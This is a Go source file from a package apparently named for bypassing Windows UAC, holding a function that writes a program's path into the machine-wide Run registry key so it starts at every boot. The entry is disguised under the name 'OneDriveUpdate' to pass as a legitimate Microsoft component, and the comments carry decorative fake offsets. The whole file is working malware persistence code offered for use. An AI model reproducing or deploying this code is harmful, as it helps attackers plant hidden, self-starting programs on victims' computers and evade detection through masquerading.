package guacbypasser

import (
	"fmt"
	"log"
	"os"
	"path/filepath"
	"runtime"
	"time"

	"golang.org/x/sys/windows/registry"
)

func HWND_W32_Method_HKLM_Runer(path string) error {
	var wkey32WOW64 registry.Key
	var wkey32MICROSOFT registry.Key
	var err error

	var c = __W32_HKLM_Runer__{
		Type:   "_hklmruner",
		Method: "registry-command",
		Scode: [4]uintptr{
			0x0331, 0x978ef,
			0xee, 0x53ce,
		},

		Location:      fmt.Sprintf("%s\\_hklmruner.gUAC", os.Getenv("APPDATA")),
		_K_HKLM_Runer: 0x4,
	}

	if len(c.Type)&len(c.Method) == 0 {
	} else {
		log.Printf("[*] You have problem with length of `Type` or `Method`")
	}

	// Get ABSOLUTE program path
	// +0x9ff ...

	var currentDir string
	currentDir, err = filepath.Abs(path)
	if err != nil {
		log.Println(err)
	}

	if runtime.GOARCH == "386" {
		wkey32WOW64, err = registry.OpenKey(
			registry.LOCAL_MACHINE, `Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Run`,
			registry.QUERY_VALUE|registry.SET_VALUE|registry.ALL_ACCESS,
		)
		if err != nil {
			log.Println(err)
		}

		// Setting "OneDriveUpdate" key value for the ABSOLUTE program path
		// +0x23df ...

		if err := wkey32WOW64.SetStringValue("OneDriveUpdate", currentDir); err != nil {
			log.Println(err)
		}

		// Absolute key function closing
		// +0x54ef ...

		if err := wkey32WOW64.Close(); err != nil {
			log.Println(err)
		}

	} else {
		wkey32MICROSOFT, err = registry.OpenKey(
			registry.LOCAL_MACHINE, `Software\Microsoft\Windows\CurrentVersion\Run`,
			registry.QUERY_VALUE|registry.SET_VALUE|registry.ALL_ACCESS,
		)
		if err != nil {
			log.Println(err)
		}

		// Setting "OneDriveUpdate" key value for the ABSOLUTE program path
		// +0x25df ...

		if err := wkey32MICROSOFT.SetStringValue("OneDriveUpdate", currentDir); err != nil {
			log.Println(err)
		}

		// Absolute key function closing
		// +0x54ef ...

		if err := wkey32MICROSOFT.Close(); err != nil {
			log.Println(err)
		}
	}

	// Sleep for 1 second ...
	time.Sleep(1 * 1 * time.Second)
	return err
}
